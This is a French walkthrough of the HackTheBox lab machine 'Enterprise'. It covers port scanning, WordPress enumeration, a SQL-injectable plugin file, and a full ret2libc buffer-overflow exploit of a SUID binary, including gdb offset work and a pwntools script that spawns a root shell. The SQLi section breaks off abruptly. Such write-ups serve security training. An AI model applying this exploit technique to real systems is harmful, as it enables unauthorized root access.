---
title: "HackTheBox - Enterprise"
description: Walkthrough de la machine Enterprise sur HackTheBox
---
![enterprise](https://i.imgur.com/I3wDQWo.png)

Bonjour à tous, aujourd'hui je vous présente une machine notée hard qui est vraiment intéréssante pour les débutants en **exploitation** de **binaire** et en **Docker container escapes** : **Enterprise** de **HackTheBox**. 😃

# Recon

## Nmap 

```sh
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp   open  http     Apache httpd 2.4.10
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp  open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
8080/tcp open  http     Apache httpd 2.4.10
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
```

Le serveur contient 4 services :
  1. Un serveur SSH
  2. Un serveur Web sur le port 80 avec un CMS WordPress
  3. Un serveur Web sur le port 443
  4. Un serveur Web sur le port 8080 avec un CMS Joomla

## WebDIR

### Port 80

![webdir_80](https://i.imgur.com/ABdoKvx.png)

### Port 443

![webdir_443](https://i.imgur.com/CAM5lST.png)

### Port 8080

![webdir_8080](https://i.imgur.com/GiyGZlh.png)

## Enumeration WordPress

Pour automatiser notre énumération, nous allons utiliser [wpscan](https://github.com/wpscanteam/wpscan) :

```sh
❯ wpscan --url http://enterprise.htb/ --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
_______________________________________________________________

[+] URL: http://enterprise.htb/ [10.10.10.61]

Interesting Finding(s):

[...]

[i] User(s) Identified:

[+] william.riker
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] william-riker
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[...]
```

Un utilisateur a été trouvé en regardant l'auteur d'un post : william.ricker

Après quelques minutes d'énumération, j'ai trouvé un fichier compréssé dans le /files, en me renseignant sur lcars je me suis rendu compte qu'il s'agissait d'un plugin :

![curl_lcars](https://i.imgur.com/ni8l4jn.png)

À l'intérieur nous avons du code php qui nous révèle une injection SQL :

```php
❯ cat lcars/lcars_db.php
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);

if (mysqli_connect_errno()){
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}

if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;
} else {
    echo "Failed to read query";
}
?>
```

# Exploitation SQLi

Essayons de générer une erreur SQL via le paramètre query :

![error_sql](https://i.imgur.com/EEfQJrb.png)



# Vertical Privilege Escalation

Après une légère énumération, nous trouvons un binaire SUID pas commum :

![suid](https://i.imgur.com/BMkUGO3.png)

SUID est un type spécial de permissions données à un fichier. Normalement, lorsqu'un programme s'exécute, il hérite des autorisations d'accès de l'utilisateur connecté. SUID est défini comme donnant des permissions temporaires à un utilisateur pour exécuter un programme/fichier avec les permissions du propriétaire du fichier plutôt que de l'utilisateur qui l'exécute.

Le programme nous demande un code d'accès... Commençons par effectuer un ltrace pour en savoir plus.

[ltrace](https://github.com/dkogan/ltrace) est un outil qui permet d'intercepter les appels dynamiques de librairie ainsi que les appels systèmes d'un processus.

![ltrace](https://i.imgur.com/pS4hmx1.png)

Ici nous pouvons voir que le programme appel la fonction **strcmp**, cette fonction compare 2 chaines de caratères. En l'occurence ici, il compare notre string entrée grace à la fonction fgets, avec le véritable code d'accès qui est picarda1.
Cependant après connexion, le programme nous affiche seulement un menu principal.

Nous comprenons donc que nous allons devoir exploiter une vulnérabilité dans notre binaire afin d'élever nos privilèges. Cependant la fonction **fgets** vérifie le buffer / la taille de notre saisie.

Nous pouvons transférer l'exécutable sur notre machine pour utiliser [gdb-peda](https://github.com/longld/peda) :

![transfert_binary](https://i.imgur.com/6uD2jeP.png)

Tout d'abord vérifions les protections applicatives que contient ce binaire ainsi que l'[ASLR](https://www.networkworld.com/article/3331199/what-does-aslr-do-for-linux.html) sur la machine cible:

```sh
ON MY MACHINE :
  ❯ checksec --file=$PWD/lcars.bin  # Check properties
  [*] '/home/nuts/Documents/Hack_The_Box/Enterprise/lcars.bin'
      Arch:     i386-32-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX disabled
      PIE:      PIE enabled
      RWX:      Has RWX segments
      
ON TARGET MACHINE:
  www-data@enterprise:/bin$ cat /proc/sys/kernel/randomize_va_space # Check ASLR
  0
```

L'ASLR est donc désactivé car sa valeur vaut 0 et non 2. Deplus NX n'est pas activé.

`L’address space layout randomization (ASLR) est une technique permettant de placer de façon aléatoire les zones de données dans la mémoire virtuelle.`

`NX est une protection qui rend la pile Non eXécutable.`

Je vais alors debugger le programme afin de comprendre son fonctionnement.

Après plusieurs minutes, j'ai trouvé un buffer overflow :

![segfault](https://i.imgur.com/bII4f6j.png)

Nous avons réussi à faire **segmentation fault** le programme grace à une saisie trop importante dans une variable non initialisée avec un buffer inférieur à la saisie car la fonction d'input ne vérifie pas la taille de notre chaine de caractères. 😁

Grâce à un buffer overflow, nous pouvons reécrire la sauvegarde EIP. (Instruction Pointer Register) Le registre EIP contient toujours l'adresse de la prochaine instruction à exécuter.

![bof_schema](https://i.imgur.com/UIh4wUo.png)

Pour cela il faut trouver le bon padding afin de overwrite convenablement nos registres (4 octets en 32 bits) et d'exécuter un shell en tant que root car je rappel que le binaire est SUID sur la machine.

Pour calculer ce padding nous allons voir 3 solutions :

### 1st solution

```py
gdb-peda$ info functions  # Print binary's functions
   [...]
gdb-peda$ disassemble main_menu 
Dump of assembler code for function main_menu:
   0x0000085e <+0>:	push   ebp
   0x0000085f <+1>:	mov    ebp,esp
   0x00000861 <+3>:	push   ebx
   0x00000862 <+4>:	sub    esp,0x1a4
   [...]
   0x00000947 <+233>:	add    esp,0x10
   0x0000094a <+236>:	sub    esp,0x8
   0x0000094d <+239>:	lea    eax,[ebp-0xd4]
   0x00000953 <+245>:	push   eax
   0x00000954 <+246>:	lea    eax,[ebx-0x206e]
   0x0000095a <+252>:	push   eax
   0x0000095b <+253>:	call   0x5c0 <__isoc99_scanf@plt>
   [...]
gdb-peda$ p/d 0xd4  # Convert hex to dec with gdb
$1 = 212
```

On récupére la valeur du lea juste avant la fonction stdin et on convertit cette valeur hexadécimal en décimal et on obtient un buffer de 212 chars.

### 2nd solution

Lorsque l’on utilise ce pattern pour causer un buffer overflow à l’intérieur d’un debugger, nous pouvons identifier exactement quels caractères écrasent l'adresse de retour.

Tout d'abord je vais créer un pattern de 500 bytes :

```py
gdb-peda$ pattern create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
```

Ensuite je vais run le programme avec cette structure :

![pattern_search](https://i.imgur.com/g8tVTdB.png)

Nous trouvons encore une fois 212 octets.

### 3rd solution

Posons un breakpoint à la fonction main et lançons le programme :

```py
❯ gdb -q lcars.bin  # Launch gdb-peda
gdb-peda$ b main  # Breakpoint at main 
  Breakpoint 1 at 0xca0
gdb-peda$ run # Run the program
  Starting program: /home/nuts/Documents/Hack_The_Box/Enterprise/lcars.bin

  Breakpoint 1, 0x56555ca0 in main ()
```

Désassemblons la fonction main_menu pour trouver l'adresse mémoire de printf :

```py
gdb-peda$ disassemble main_menu   # Disassemble main_menu to find addr
Dump of assembler code for function main_menu:
   [...]
   0x56555ad7 <+633>:	call   0x565555c0 <__isoc99_scanf@plt>
   0x56555adc <+638>:	add    esp,0x10
   0x56555adf <+641>:	sub    esp,0x8
   0x56555ae2 <+644>:	lea    eax,[ebp-0xd0]
   0x56555ae8 <+650>:	push   eax
   0x56555ae9 <+651>:	lea    eax,[ebx-0x2138]
   0x56555aef <+657>:	push   eax
   0x56555af0 <+658>:	call   0x56555560 <printf@plt>
   0x56555af5 <+663>:	add    esp,0x10
   [...]
```

Posons un breakpoint à l'adresse juste après l'appel de la fonction printf et continuons le programme:

```py
gdb-peda$ b *0x56555af5 # Put breakpoint at after call function plt printf
  Breakpoint 2 at 0x56555af5
gdb-peda$ continue  # continue
```

Après avoir entrez les informations nécéssaires au binaire, nous pouvons voir notre saisie dans la stack :

```py
[----------------------------------registers-----------------------------------]
   [...]
[-------------------------------------code-------------------------------------]
   [...]
   0x56555af0 <main_menu+658>:	call   0x56555560 <printf@plt>
=> 0x56555af5 <main_menu+663>:	add    esp,0x10
   [...]
[------------------------------------stack-------------------------------------]
0000| 0xffffcaa0 --> 0x56555ec8 ("Rerouting Tertiary EPS Junctions: %s")
0004| 0xffffcaa4 --> 0xffffcb88 ("AAAAAAAAA")
0008| 0xffffcaa8 --> 0xffffcc58 --> 0xffffcc98 --> 0xffffccc8 --> 0x0 
0012| 0xffffcaac --> 0x56555882 (<main_menu+36>:	sub    esp,0xc)
   [...]
[------------------------------------------------------------------------------]
```

Le buffer commence à 0xffffcb88.

Affichons la trame de la stack :

```py
gdb-peda$ info f
Stack level 0, frame at 0xffffcc60:
 eip = 0x56555af5 in main_menu; saved eip = 0x56555c5f
 called by frame at 0xffffcca0
 Arglist at 0xffffcc58, args: 
 Locals at 0xffffcc58, Previous frame's sp is 0xffffcc60
 Saved registers:
  ebx at 0xffffcc54, ebp at 0xffffcc58, eip at 0xffffcc5c
```

EIP est à 0xffffcc5c

Nous allons soustraire les adresses mémoires de EIP - adresse début buffer :

```py
gdb-peda$ p/d 0xffffcc5c - 0xffffcb88 # EIP - BEGIN BUFFER
$1 = 212
```

Tout cela convertit en décimal et nous obtenons 212.

## Exploitation + Scripting (pwntools)

Maintenant que nous sommes certain de la zone à écraser nous pouvons effectuer un **ret2libc**.

À chaque fois que vous écrivez un programme C, vous utilisez des fonctions intégrées comme puts, fgets, scanf... Toutes ces fonctions C standard ont été compilées dans un seul fichier, appelé libc. Nous pouvons utiliser [ldd](https://github.com/matrix207/ldd) pour savoir quelle libc est utilisée pour ce binaire.

`Le ret2libc est une méthode qui permet d’exécuter des fonctions de la libc comme system, ce qui va être très pratique dans notre cas.`

Maintenant, nous devons localiser les emplacements des fonctions nécessaires sur la machine cible. Ceci est simple car l'ASLR est désactivé :

```py
(gdb) p system
p system
$1 = {<text variable, no debug info>} 0xf7e4c060 <system>
(gdb) p exit
p exit
$2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
```

De plus il nous faut l'adresse de la chaine sh pour exécuter un shell :

```py
(gdb) find &system,+9999999,"sh"
  0xf7f6ddd5
(gdb) x/s 0xf7f6ddd5
  0xf7f6ddd5:	"sh"
```

Globalement, sh va être passé en argument à la fonction system.

Notre payload va alors ressembler à ceci : `212 octets + Adresse System + Adresse Exit + Adresse SH`

Pour illustrer notre payload :

![payload_schema](https://i.imgur.com/KtbdNeN.png)

Nous devons convertir les adresses en little endian.
Notre payload sera donc :

`\x90 * 212 + \x60\xc0\xe4\xf7 +  \xf0\xfa\xe3\xf7 + \xd5\xdd\xf6\xf7`

J'ai donc créer un script avec le module pwntools qui est très pratique en python :

```py
from pwn import *

RHOST, RPORT = '10.10.10.61', 32812

padding = 212
pld = '\x90' * padding + p32(0xf7e4c060) + p32(0xf7e3faf0) + p32(0xf7f6ddd5)
# Addr Sys + Addr Exit + Addr sh

print `pld`

r = remote(RHOST,RPORT)

r.recvuntil('Enter Bridge Access Code: ')
r.sendline('picarda1')

r.recvuntil('Waiting for input: ')
r.sendline('4')

r.recvuntil('Enter Security Override:')
r.sendline(pld)

r.interactive()
```

Pour trouver le port cible nous devons lister les ports ouverts sur la machine :

![port31812](https://i.imgur.com/cMMIQmh.png)

![execution_script_py](https://i.imgur.com/UT2Tv5w.png)

Voila nous sommes enfin root ! 😎

N'oubliez pas de star mon profil HackTheBox. 😆

<script src="https://www.hackthebox.eu/badge/428983"></script>
